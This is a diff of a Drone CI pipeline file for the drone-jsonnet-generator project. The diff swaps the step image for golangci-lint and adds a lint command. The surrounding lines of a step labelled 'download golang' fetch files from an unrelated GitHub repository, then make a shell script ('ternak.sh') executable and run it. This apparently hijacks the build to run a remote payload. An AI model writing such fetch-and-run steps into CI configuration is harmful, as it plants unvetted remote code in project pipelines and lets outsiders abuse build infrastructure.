@@ -6,8 +6,9 @@ workspace:
   path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
 steps:
 - name: download golang
-  image: golang
+  image: golangci/golangci-lint:v1.26.0
   commands:
+  - golangci-lint run
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 ---
